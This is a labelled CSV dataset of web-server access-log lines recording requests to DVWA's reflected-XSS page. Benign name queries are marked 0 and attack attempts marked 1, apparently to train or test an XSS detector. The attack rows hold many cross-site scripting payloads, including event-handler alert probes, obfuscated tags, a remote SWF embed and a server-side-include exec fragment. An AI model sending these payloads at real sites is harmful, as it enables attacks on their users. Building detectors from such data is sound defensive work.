,url,malicious
18698,"127.0.0.1 - - [03/May/2021:03:17:41 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Hqs HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
7744,"127.0.0.1 - - [03/May/2021:03:06:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=imagenes HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
9235,"127.0.0.1 - - [03/May/2021:03:40:59 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<noembed onbeforecopy=\""alert(1)\"""" 400 0 ""-"" ""-""",1
14969,"127.0.0.1 - - [03/May/2021:03:41:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<output onkeydown=\""alert(1)\"""" 400 0 ""-"" ""-""",1
7845,"127.0.0.1 - - [03/May/2021:02:35:05 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<iframe/src=\""data:text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==\""> HTTP/1.1"" 200 1707 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=aaa"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
8217,"127.0.0.1 - - [03/May/2021:03:40:57 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<menu onmouseup=\""alert(1)\"">test</menu>"" 400 0 ""-"" ""-""",1
13070,"127.0.0.1 - - [03/May/2021:03:41:38 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<![><img src=\""]><img"" 400 0 ""-"" ""-""",1
14713,"127.0.0.1 - - [03/May/2021:02:34:49 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<script\\x09type=\""text/javascript\"">javascript:alert(1);</script> HTTP/1.1"" 200 1717 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=aaa"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
3178,"127.0.0.1 - - [03/May/2021:02:35:05 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<IMG SRC=x"" 400 0 ""-"" ""-""",1
8857,"127.0.0.1 - - [03/May/2021:03:40:36 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<dialog id=x"" 400 0 ""-"" ""-""",1
4679,"127.0.0.1 - - [03/May/2021:03:25:45 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Sergio HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
14277,"127.0.0.1 - - [03/May/2021:03:05:26 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=brenda HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
9836,"127.0.0.1 - - [03/May/2021:03:40:53 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<label draggable=\""true\"""" 400 0 ""-"" ""-""",1
9395,"127.0.0.1 - - [03/May/2021:03:18:15 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Jagjeet HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
13906,"127.0.0.1 - - [03/May/2021:03:40:53 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<keygen id=x"" 400 0 ""-"" ""-""",1
11884,"127.0.0.1 - - [03/May/2021:03:20:21 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Leo HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
18315,"127.0.0.1 - - [03/May/2021:03:40:40 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<div draggable=\""true\"""" 400 0 ""-"" ""-""",1
14402,"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=ABC<div style=\""x:\\xE2\\x80\\x83expression(javascript:alert(1)\"">DEF"" 400 0 ""-"" ""-""",1
13450,"127.0.0.1 - - [03/May/2021:02:34:57 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<IMG STYLE=\""xss:expr/*XSS*/ession(javascript:alert(1))\"">"" 400 0 ""-"" ""-""",1
3741,"127.0.0.1 - - [03/May/2021:02:35:18 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<!--#exec cmd=\""/bin/echo"" 400 0 ""-"" ""-""",1
8092,"127.0.0.1 - - [03/May/2021:03:28:38 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Yue-Min HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
3300,"127.0.0.1 - - [03/May/2021:03:40:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<details draggable=\""true\"""" 400 0 ""-"" ""-""",1
13217,"127.0.0.1 - - [03/May/2021:03:25:24 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Ryann HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
8465,"127.0.0.1 - - [03/May/2021:03:40:51 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<img srcset=validimage.png"" 400 0 ""-"" ""-""",1
8751,"127.0.0.1 - - [03/May/2021:03:41:38 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<deTAiLs/open/oNtoGGle=confirm()> HTTP/1.1"" 200 1720 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
17150,"127.0.0.1 - - [03/May/2021:03:12:55 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Celyne HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
8688,"127.0.0.1 - - [03/May/2021:03:22:01 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Mason HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
12630,"127.0.0.1 - - [03/May/2021:03:27:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Trista HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
5413,"127.0.0.1 - - [03/May/2021:03:23:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Nathaniel HTTP/1.1"" 200 1701 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
1402,"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<// style=x:expression\\28javascript:alert(1)\\29>"" 400 0 ""-"" ""-""",1
10189,"127.0.0.1 - - [03/May/2021:03:05:48 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=confirmacio HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
14947,"127.0.0.1 - - [03/May/2021:03:40:59 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<noframes draggable=\""true\"""" 400 0 ""-"" ""-""",1
5355,"127.0.0.1 - - [03/May/2021:03:40:55 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<marquee onkeypress=\""alert(1)\"""" 400 0 ""-"" ""-""",1
6577,"127.0.0.1 - - [03/May/2021:02:34:55 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<div style=\""list-style:url(http://foo.f)\\20url(javascript:javascript:alert(1));\"">X"" 400 0 ""-"" ""-""",1
18116,"127.0.0.1 - - [03/May/2021:03:18:48 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=John-Paul HTTP/1.1"" 200 1701 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
345,"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<thead draggable=\""true\"""" 400 0 ""-"" ""-""",1
5085,"127.0.0.1 - - [03/May/2021:03:12:14 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Brett HTTP/1.1"" 200 1695 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
8892,"127.0.0.1 - - [03/May/2021:03:40:57 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<multicol onbeforecut=\""alert(1)\"""" 400 0 ""-"" ""-""",1
2884,"127.0.0.1 - - [03/May/2021:02:35:01 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<img src"" 400 0 ""-"" ""-""",1
12583,"127.0.0.1 - - [03/May/2021:03:40:18 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<x on%78xx=1"" 400 0 ""-"" ""-""",1
15202,"127.0.0.1 - - [03/May/2021:03:15:14 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Elly HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
1809,"127.0.0.1 - - [03/May/2021:03:08:28 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=usuarios HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
12853,"127.0.0.1 - - [03/May/2021:02:35:16 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<;IMG SRC=\"";jav&;#x0A;ascript:alert(';XSS';);\"";>;"" 400 0 ""-"" ""-""",1
5993,"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<IFRAME SRC=\""javascript:javascript:alert(1);\""></IFRAME>"" 400 0 ""-"" ""-""",1
17875,"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<track id=x"" 400 0 ""-"" ""-""",1
1668,"127.0.0.1 - - [03/May/2021:03:40:45 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<footer onmousedown=\""alert(1)\"">test</footer>"" 400 0 ""-"" ""-""",1
8767,"127.0.0.1 - - [03/May/2021:03:41:29 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<textarea draggable=\""true\"""" 400 0 ""-"" ""-""",1
1813,"127.0.0.1 - - [03/May/2021:03:20:00 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Kristi HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
6488,"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<track onmousedown=\""alert(1)\"">test</track>"" 400 0 ""-"" ""-""",1
13506,"127.0.0.1 - - [03/May/2021:03:27:26 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Tom HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
16576,"127.0.0.1 - - [03/May/2021:03:13:22 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Clari HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
2846,"127.0.0.1 - - [03/May/2021:03:25:13 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Roseann HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
9333,"127.0.0.1 - - [03/May/2021:03:08:21 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=treballadors HTTP/1.1"" 200 1701 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
8046,"127.0.0.1 - - [03/May/2021:03:11:14 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Ashu HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
14509,"127.0.0.1 - - [03/May/2021:03:24:10 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Piper HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
10946,"127.0.0.1 - - [03/May/2021:03:41:01 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<noscript draggable=\""true\"""" 400 0 ""-"" ""-""",1
2822,"127.0.0.1 - - [03/May/2021:03:40:45 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<frameset oncontextmenu=\""alert(1)\"">test</frameset>"" 400 0 ""-"" ""-""",1
11789,"127.0.0.1 - - [03/May/2021:03:12:42 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Carry HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
121,"127.0.0.1 - - [03/May/2021:03:40:59 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<nav onmouseenter=\""alert(1)\"">test</nav>"" 400 0 ""-"" ""-""",1
17121,"127.0.0.1 - - [03/May/2021:03:40:25 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<basefont id=x"" 400 0 ""-"" ""-""",1
16348,"127.0.0.1 - - [03/May/2021:03:14:29 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Diju HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
9206,"127.0.0.1 - - [03/May/2021:02:35:05 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<meta http-equiv=\""refresh\"""" 400 0 ""-"" ""-""",1
1175,"127.0.0.1 - - [03/May/2021:03:40:36 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<dfn onmousedown=\""alert(1)\"">test</dfn>"" 400 0 ""-"" ""-""",1
6160,"127.0.0.1 - - [03/May/2021:03:16:56 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Gretta HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
18628,"127.0.0.1 - - [03/May/2021:03:14:02 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Darlleen HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
17395,"127.0.0.1 - - [03/May/2021:03:41:25 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<sub id=x"" 400 0 ""-"" ""-""",1
2510,"127.0.0.1 - - [03/May/2021:03:19:37 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Kelsy HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
6952,"127.0.0.1 - - [03/May/2021:03:40:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<details onbeforecopy=\""alert(1)\"""" 400 0 ""-"" ""-""",1
11674,"127.0.0.1 - - [03/May/2021:03:23:56 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Paulinus HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
11018,"127.0.0.1 - - [03/May/2021:03:14:48 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Dpnis HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
3143,"127.0.0.1 - - [03/May/2021:03:14:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Darsie HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
14575,"127.0.0.1 - - [03/May/2021:03:23:56 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Paulette HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
3189,"127.0.0.1 - - [03/May/2021:02:34:59 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<embed code=\""http://businessinfo.co.uk/labs/xss/xss.swf\"""" 400 0 ""-"" ""-""",1
11866,"127.0.0.1 - - [03/May/2021:03:41:33 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<track onkeypress=\""alert(1)\"""" 400 0 ""-"" ""-""",1
5077,"127.0.0.1 - - [03/May/2021:03:40:36 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<div draggable=\""true\"""" 400 0 ""-"" ""-""",1
2171,"127.0.0.1 - - [03/May/2021:03:07:36 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=production HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
5334,"127.0.0.1 - - [03/May/2021:03:16:16 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Fred HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
492,"127.0.0.1 - - [03/May/2021:03:25:56 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Sharl HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
11091,"127.0.0.1 - - [03/May/2021:03:10:55 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Anton-Phuoc HTTP/1.1"" 200 1703 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
14479,"127.0.0.1 - - [03/May/2021:03:41:29 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<td onmousemove=\""alert(1)\"">test</td>"" 400 0 ""-"" ""-""",1
3978,"127.0.0.1 - - [03/May/2021:03:41:38 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<script x>"" 400 0 ""-"" ""-""",1
18157,"127.0.0.1 - - [03/May/2021:03:07:14 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=noxious HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
5904,"127.0.0.1 - - [03/May/2021:03:23:00 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Nanon HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
11779,"127.0.0.1 - - [03/May/2021:03:23:59 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Penny HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
1839,"127.0.0.1 - - [03/May/2021:03:16:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Fionan HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
17439,"127.0.0.1 - - [03/May/2021:03:18:58 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Juana HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
12240,"127.0.0.1 - - [03/May/2021:03:41:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<picture onmouseleave=\""alert(1)\"">test</picture>"" 400 0 ""-"" ""-""",1
6734,"127.0.0.1 - - [03/May/2021:03:26:04 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Sher HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
3899,"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<meta content=\""&NewLine;"" 400 0 ""-"" ""-""",1
12986,"127.0.0.1 - - [03/May/2021:02:23:48 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3cx%20contenteditable%20oninput%3dalert(1)%3einput%20here!%20 HTTP/1.1"" 200 1683 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
14862,"127.0.0.1 - - [03/May/2021:03:41:29 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<table onmouseout=\""alert(1)\"">test</table>"" 400 0 ""-"" ""-""",1
11485,"127.0.0.1 - - [03/May/2021:03:26:26 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Sorcha HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
16101,"127.0.0.1 - - [03/May/2021:02:35:07 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=\""'`>ABC<div style=\""font-family:'foo'\\x7Dx:expression(javascript:alert(1);/*';\"">DEF"" 400 0 ""-"" ""-""",1
7783,"127.0.0.1 - - [03/May/2021:03:41:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<ul draggable=\""true\"""" 400 0 ""-"" ""-""",1
17380,"127.0.0.1 - - [03/May/2021:03:15:36 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Ertan HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
15093,"127.0.0.1 - - [03/May/2021:03:25:21 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Russel HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
2773,"127.0.0.1 - - [03/May/2021:03:11:06 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Ariana HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
14525,"127.0.0.1 - - [03/May/2021:03:07:12 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=mostrar HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
15369,"127.0.0.1 - - [03/May/2021:03:23:43 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Otha HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
18337,"127.0.0.1 - - [03/May/2021:03:15:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Erma HTTP/1.1"" 200 1695 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
3121,"127.0.0.1 - - [03/May/2021:03:21:00 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Luelle HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
11014,"127.0.0.1 - - [03/May/2021:03:19:55 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Kordula HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
11876,"127.0.0.1 - - [03/May/2021:03:40:23 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<article onmousemove=\""alert(1)\"">test</article>"" 400 0 ""-"" ""-""",1
14029,"127.0.0.1 - - [03/May/2021:03:40:45 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<footer id=x"" 400 0 ""-"" ""-""",1
12296,"127.0.0.1 - - [03/May/2021:03:41:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<plaintext onbeforecut=\""alert(1)\"""" 400 0 ""-"" ""-""",1
